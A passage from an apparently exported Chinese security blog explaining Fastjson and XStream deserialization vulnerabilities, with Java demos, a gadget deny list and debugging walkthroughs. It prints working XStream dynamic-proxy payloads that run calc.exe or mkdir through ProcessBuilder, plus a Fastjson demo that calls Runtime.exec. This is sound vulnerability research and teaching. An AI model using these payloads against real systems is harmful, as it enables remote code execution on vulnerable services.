denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets： 12345678910111213141516171819202122bshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework 这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。 运行能看到报错信息，说autoType不支持该类： 调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的： autoTypeSupportautoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。 默认情况下autoTypeSupport为False，将其设置为True有两种方法： JVM启动参数：-Dfastjson.parser.autoTypeSupport=true 代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true); AutoType白名单设置方法： JVM启动参数：-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy. 代码中设置：ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;); 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao. OK，Fastjson 1.2.22-1.2.24 反序列化漏洞分析到这，接下来一篇就写对各个补丁版本的checkAutoType()黑名单绕过。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Fastjson系列一——反序列化漏洞基本原理","date":"2019-11-03T10:51:00.000Z","path":"2019/11/03/Fastjson系列一——反序列化漏洞基本原理/","text":"0x01 基本概念Fastjson简介Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。 项目地址：https://github.com/alibaba/fastjson 使用Fastjson进行序列化和反序列化这里通过Demo了解下如何使用Fastjson进行序列化和反序列化，以及其中的一些特性之间的区别等等。 Student.java，定义的一个学生类，其中包含两个属性及其getter/setter方法，还有类的构造函数： 12345678910111213141516171819202122232425262728public class Student &#123; private String name; private int age; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public void setAge(int age) &#123; System.out.println(\"setAge\"); this.age = age; &#125;&#125; FJTest.java，调用JSON.toJsonString()来序列化Student类对象 ： 123456789public class FJTest &#123; public static void main(String[] args)&#123; Student student = new Student(); student.setName(\"Mi1k7ea\"); student.setAge(6); String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName); System.out.println(jsonstring); &#125;&#125; SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。 Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。 输出如下： 123456789101112131415// 设置了SerializerFeature.WriteClassName构造函数setNamesetAgegetAgegetName&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;// 未设置SerializerFeature.WriteClassName构造函数setNamesetAgegetAgegetName&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125; FJTest2.java，调用JSON.parseObject()反序列化JSON为对象： 12345678public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Mi1k7ea\\\"&#125;\"; Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125;&#125; 输出： 12345构造函数setAgesetNameStudent@75b9fd80Student 反序列化类图Fastjson反序列化的类方法调用关系如图： JSON：门面类，提供入口 DefaultJSONParser：主类 ParserConfig：配置相关类 JSONLexerBase：字符分析类 JavaBeanDeserializer：JavaBean反序列化类 Feature.SupportNonPublicField如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。 这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）： 12345678910111213141516171819202122232425262728public class Student &#123; private String name; private int age; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125;// public void setAge(int age) &#123;// System.out.println(\"setAge\");// this.age = age;// &#125;&#125; 修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值： 123456789public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Mi1k7ea\\\"&#125;\"; Student obj = JSON.parseObject(jsonstring, Student.class); System.out.println(obj); System.out.println(obj.getClass().getName()); System.out.println(obj.getName() + \" \" + obj.getAge()); &#125;&#125; 重新运行，会看到获取不到私有变量age的值而是被设置为0： 1234567构造函数setNameStudent@7addc524StudentgetNamegetAgeMi1k7ea 0 接着添加Feature.SupportNonPublicField： 1Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField); 再输出就能成功还原出age这个私有变量的值了： 1234567构造函数setNameStudent@2c59109cStudentgetNamegetAgeMi1k7ea 6 也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。 反序列化时几种类型设置的比较再来看下parseObject()的指定或不指定反序列化类型之间的差异。 由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。 修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）： 1234567891011121314151617181920212223242526272829303132333435public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public String getAddress() &#123; System.out.println(\"getAddress\"); return address; &#125; public Properties getProperties() &#123; System.out.println(\"getProperties\"); return properties; &#125;&#125; 未设置Feature.SupportNonPublicField修改FJTest2.java，先是默认调用parseObject()不带指定类型的参数： 12345678910public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Mi1k7ea\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\"; Object obj = JSON.parseObject(jsonstring); // 或以下语句，输出结果一致 //JSONObject obj = JSON.parseObject(jsonstring); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125;&#125; 输出看到，调用了Student类的构造函数、所有属性的getter方法、JSON里面非私有属性的setter方法，其中getProperties()调用了两次；无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的： 123456789构造函数setNamegetPropertiesgetAddressgetAgegetNamegetProperties&#123;&quot;name&quot;:&quot;Mi1k7ea&quot;,&quot;age&quot;:0&#125;com.alibaba.fastjson.JSONObject 接着在FJTest2.java中修改反序列化代码语句如下，加上指定反序列化得到的类型为Object.class或Student.class： 1234567Object obj = JSON.parseObject(jsonstring, Object.class);// 或以下语句，输出结果一致//Object obj = JSON.parseObject(jsonstring, Student.class);// 或以下语句，输出结果一致//Student obj = JSON.parseObject(jsonstring, Student.class);// 另外，JSONObject类不支持这种写法 输出看到，调用了Student类的构造函数、JSON里面非私有属性的setter方法、properties成员变量的的getter方法，反序列化得到的是Student类对象即反序列化成功，也就是说只要添加了指定的类这个参数，通过@type的作用parseObject()都会成功将JSON反序列化为@type指定的类： 12345构造函数setNamegetPropertiesStudent@ca140c2Student 设置Feature.SupportNonPublicField修改FJTest2.java中反序列化代码语句如下： 12345Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);// 或以下语句，输出结果一致//Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);// 或以下语句，输出结果一致//Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField); 输出，发现和未设置Feature.SupportNonPublicField的是一致的： 12345构造函数setNamegetPropertiesStudent@4c00c0cfStudent 小结根据前面的结果，有如下结论： 当反序列化为JSON.parseObject(*)形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次； 当反序列化为JSON.parseObject(*,*.class)形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法； 当反序列化为JSON.parseObject(*)形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即JSON.parseObject(*,*.class)形式得到的都是特定的Student类； 下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用： 满足条件的setter： 函数名长度大于4且以set开头 非静态函数 返回类型为void或当前类 参数个数为1个 满足条件的getter： 函数名长度大于等于4 非静态方法 以get开头且第4个字母为大写 无参数 返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong 注意，除了getter方法和setter方法外，还有个is方法这里没有列举，可自行测试。 前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的getter方法时继承自Map，从而能够成功被Fastjson调用。 parse与parseObject区别前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。 FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。 也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。 修改FJTest2.java中的parseObject()为parse()： 12345678910public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Mi1k7ea\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\"; Object obj = JSON.parse(jsonstring); // 或以下语句，输出结果一致// Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125;&#125; 输出： 12345构造函数setNamegetPropertiesStudent@398600d7Student 0x02 Fastjson反序列化漏洞原理漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。 通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 那么如何才能够反序列化出恶意类呢？ 由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。 接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？ 由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。 我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法： 12345678@SuppressWarnings(&#123; \"unchecked\", \"rawtypes\" &#125;)public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEY即@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); 整个解析过程相当复杂，知道结论就ok了。 小结一下 若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； 若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； PoC写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类： 12345&#123;\"@type\":\"xxx.xxx.xxx\",\"xxx\":\"xxx\",...&#125; 关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件： 该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行； 可以控制该漏洞函数的变量（一般就是该类的属性）； 漏洞Demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示： 123456789101112131415161718192021222324252627282930313233343536public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public String getAddress() &#123; System.out.println(\"getAddress\"); return address; &#125; public Properties getProperties() throws Exception &#123; System.out.println(\"getProperties\"); Runtime.getRuntime().exec(\"calc\"); return properties; &#125;&#125; FJTest2.java： 12345678public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Mi1k7ea\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\"; Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125;&#125; 运行即可弹计算器： 很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。 对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景： 1Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField); OK，Fastjson反序列化漏洞的一些基本概念原理就写到这了，下一篇写2017年的Fastjson 1.2.22-1.2.24 反序列化漏洞。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java XStream反序列化漏洞","date":"2019-10-21T15:19:07.000Z","path":"2019/10/21/XStream反序列化漏洞/","text":"0x01 基本概念XStream简介XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。 使用XStream实现序列化与反序列化下面看下如何使用XStream进行序列化和反序列化操作的。 先定义IPerson.java接口类： 123public interface IPerson &#123; void output();&#125; 接着定义Person类实现前面的接口： 12345678public class Person implements IPerson &#123; String name; int age; public void output() &#123; System.out.print(\"Hello, this is \" + this.name + \", age \" + this.age); &#125;&#125; XStream序列化是调用XStream.toXML()来实现的： 12345678910public class Test &#123; public static void main(String[] args) &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; XStream xstream = new XStream(new DomDriver()); String xml = xstream.toXML(p); System.out.println(xml); &#125;&#125; 输出内容： 1234&lt;Person&gt; &lt;name&gt;mi1k7ea&lt;/name&gt; &lt;age&gt;6&lt;/age&gt;&lt;/Person&gt; 将输出结果保存为person.xml文件。 XStream反序列化是用过调用XStream.fromXML()来实现的，其中获取XML文件内容的方式可以通过Scanner()或FileInputStream都可以： 1234567891011121314151617import com.thoughtworks.xstream.XStream;import com.thoughtworks.xstream.io.xml.DomDriver;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.util.Scanner;public class Test &#123; public static void main(String[] args) throws FileNotFoundException &#123;// String xml = new Scanner(new File(\"person.xml\")).useDelimiter(\"\\\\Z\").next(); FileInputStream xml = new FileInputStream(\"person.xml\"); XStream xstream = new XStream(new DomDriver()); Person p = (Person) xstream.fromXML(xml); p.output(); &#125;&#125; 输出结果为： 1Hello, this is mi1k7ea, age 6 Java动态代理机制在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。 通过动态代理机制，可以为某一个对象动态生成一个代理对象来替代对原对象的访问，可以有效地控制对原对象的访问并且能够很好地隐藏和保护原对象，此外还能在原对象函数的基础上添加一些额外的操作，如打印日志等。 具体的可参考：Java动态代理机制 EventHandler类EventHandler类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。 EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接。 EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用： 123456789101112131415161718192021222324public class EventHandler implements InvocationHandler &#123; private Object target; private String action; ... public Object invoke(final Object proxy, final Method method, final Object[] arguments) &#123; ... return invokeInternal(proxy, method, arguments); ... &#125; private Object invokeInternal(Object proxy, Method method, Object[] arguments) &#123; ... Method targetMethod = Statement.getMethod( target.getClass(), action, argTypes); ... return MethodUtil.invoke(targetMethod, target, newArgs); &#125; ... &#125; ...&#125; 这里重点看下EventHandler.invokeInternal()函数的代码逻辑，如注释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private Object invokeInternal(Object var1, Method var2, Object[] var3) &#123;//-------------------------------------part1----------------------------------//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称 String var4 = var2.getName(); if (var2.getDeclaringClass() == Object.class) &#123; if (var4.equals(\"hashCode\")) &#123; return new Integer(System.identityHashCode(var1)); &#125; if (var4.equals(\"equals\")) &#123; return var1 == var3[0] ? Boolean.TRUE : Boolean.FALSE; &#125; if (var4.equals(\"toString\")) &#123; return var1.getClass().getName() + '@' + Integer.toHexString(var1.hashCode()); &#125; &#125;//-------------------------------------part2----------------------------------//貌似获取了一个class和object if (this.listenerMethodName != null &amp;&amp; !this.listenerMethodName.equals(var4)) &#123; return null; &#125; else &#123; Class[] var5 = null; Object[] var6 = null; if (this.eventPropertyName == null) &#123; var6 = new Object[0]; var5 = new Class[0]; &#125; else &#123; Object var7 = this.applyGetters(var3[0], this.getEventPropertyName()); var6 = new Object[]&#123;var7&#125;; var5 = new Class[]&#123;var7 == null ? null : var7.getClass()&#125;; &#125;//------------------------------------------------------------------------------ try &#123; int var12 = this.action.lastIndexOf(46); if (var12 != -1) &#123; this.target = this.applyGetters(this.target, this.action.substring(0, var12)); this.action = this.action.substring(var12 + 1); &#125;//--------------------------------------part3----------------------------------------//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException Method var13 = Statement.getMethod(this.target.getClass(), this.action, var5);//--------------------------------------------------------------------------//判断var13是否为空,当然不为空啦 if (var13 == null) &#123; var13 = Statement.getMethod(this.target.getClass(), \"set\" + NameGenerator.capitalize(this.action), var5); &#125; if (var13 == null) &#123; String var9 = var5.length == 0 ? \" with no arguments\" : \" with argument \" + var5[0]; throw new RuntimeException(\"No method called \" + this.action + \" on \" + this.target.getClass() + var9); &#125; else &#123;//-------------------------------------part4----------------------------------//调用invoke,调用函数,执行命令 return MethodUtil.invoke(var13, this.target, var6); &#125;//------------------------------------------------------------------------------ &#125; catch (IllegalAccessException var10) &#123; throw new RuntimeException(var10); &#125; catch (InvocationTargetException var11) &#123; Throwable var8 = var11.getTargetException(); throw var8 instanceof RuntimeException ? (RuntimeException)var8 : new RuntimeException(var8); &#125; &#125;&#125; Converter转换器XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。 转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。 简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。 转换器需要实现3个方法： canConvert方法：告诉XStream对象，它能够转换的对象； marshal方法：能够将对象转换为XML时候的具体操作； unmarshal方法：能够将XML转换为对象时的具体操作； 具体参考：http://x-stream.github.io/converters.html DynamicProxyConverter DynamicProxyConverter即动态代理转换器，是XStream支持的一种转换器，其存在使得XStream能够把XML内容反序列化转换为动态代理类对象： XStream反序列化漏洞的PoC都是以DynamicProxyConverter这个转换器为基础来编写的。 以官网给的例子为例： 1234567&lt;dynamic-proxy&gt; &lt;interface&gt;com.foo.Blah&lt;/interface&gt; &lt;interface&gt;com.foo.Woo&lt;/interface&gt; &lt;handler class=\"com.foo.MyHandler\"&gt; &lt;something&gt;blah&lt;/something&gt; &lt;/handler&gt;&lt;/dynamic-proxy&gt; dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。 0x02 XStream反序列化漏洞影响范围在1.4.x系列版本中，&lt;=1.4.6或=1.4.10是存在反序列化漏洞的。 基本原理XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，这便与原生的Java序列化和反序列化机制有所区别，因此两者的反序列化漏洞也是有着很大区别的。 XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。 几种PoC浅析基于sorted-set的PoC适用范围1.4.5，1.4.6，1.4.10 复现复现用的XStream版本是1.4.6。 payload1.xml： 1234567891011121314&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 运行触发： 如果想加入多条命令，如创建目录等，可改为如下的payload： 123456789101112131415161718192021222324252627282930313233343536// Windows&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;cmd&lt;/string&gt; &lt;string&gt;/C&lt;/string&gt; &lt;string&gt;md&lt;/string&gt; &lt;string&gt;mi1k7ea&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;// Linux&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;string&gt;-c&lt;/string&gt; &lt;string&gt;\"mkdir mi1k7ea\"&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 调试分析下面我们在xstream.fromXML()语句中打上断点进行调试，同时在EventHandler类中的invoke()和invokeInternal()函数上也打上断点。 在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML： 跟进start()函数，发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型java.util.SortedSet： 接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型： 接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器。我们跟进这个函数看看，其是变量所有转换器，通过调用Converter.canConvert()函数来判断该转换器是否能够转换出TreeSet类型，这里找到满足条件的TreeSetConverter转换器： 在XStream官网中可以查到类对应的Converter：http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html 接着是调用typeToConverterMap.put(type, converter);将类型和转换器的对应关系放入Map表中，再返回转换器： 往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中： 接着调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法： 往下调试，在TreeSetConverter.unmarshal()函数中调用了this.treeMapConverter.populateTreeMap()： 跟进该函数，先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容缓存到Map中： 跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中： 返回到populateTreeMap()函数中，调用了reader.moveUp();即开始往下读其他元素，然后调用populateMap()函数： 跟进populateMap()，其中调用了populateCollection()函数，用来循环遍历子标签中的元素并添加到集合中，如图是将动态代理标签添加进集合中： 而调用的addCurrentElementToCollection()中，会调用readItem()读取标签内容，这里直接跳过具体的读取步骤，看到是成功获取到了该动态代理类并添加到了target这个Map缓存起来了： 继续跟进去几个函数，会发现调用DynamicProxyConverter.unmarshal()函数，这是由于PoC中含有dynamic-proxy标签会被程序识别并调用对应的DynamicProxyConverter转换器来实现将XML中该标签部分转换成动态代理类对象。而在该转换器的unmarshal()函数中，主要是扫描该标签的内容，然后调用Proxy.newProxyInstance()函数来生成新的动态代理类对象并返回（该动态代理类的target为EventHandler，action为start）： 在上图我们可以看到DynamicProxyConverter.unmarshal()函数中调用了convertAnother()函数来转换得到EventHandler，跟进该函数会发现是调用了ReflectionConverter转换器来进行EventHandler的解析的： 下面继续往下调试，回到populateMap()调用的地方。 调用完populateMap()之后，会判断JVM是否已充分将TreeMap都缓存起来了，然后调用TreeMap类对象resullt的putAll()方法，可看到参数中包含动态代理类，该代理类指向EventHandler类，而该类正如前面介绍时说的那样通过传入target和action参数值来利用反射机制调用了ProcessBuilder(cmd).start()来执行任意命令： 再跟进去调试，调试到TreeMap.put()函数中发现会调用到动态代理类对象$Proxy0的compareTo()方法来比较动态代理类对象和另一个字符串对象： 由于我们PoC中interface标签写的是java.lang.Comparable接口，而该接口声明了一个compareTo()方法，因此当调用了动态代理类对象中的Comparable.compareTo()方法时就能成功动态调用PoC中构造的恶意动态代理类，从而通过反射机制达到任意代码执行。 再往下，会调用到EventHandler.invoke()，其中会通过安全管理器获得权限来执行EventHandler.invokeInternal()函数，可以看到proxy参数是动态代理类对象、\\9-]参数是compareTo方法、arguments参数是包含”foo”字符串的数组： 在EventHandler.invokeInternal()函数中，获取到目标动态代理类对象的实际方法后，就直接通过反射机制调用，从而导致弹计算器： 小结我们在PoC中构造了一对sorted-set标签，其中包含实现了Comparable接口的dynamic-proxy标签，该代理标签中又包含一个指向EventHandler的handler标签，而Eventhandler中则包含了一个ProcessBuilder的target和值为’start’的action。 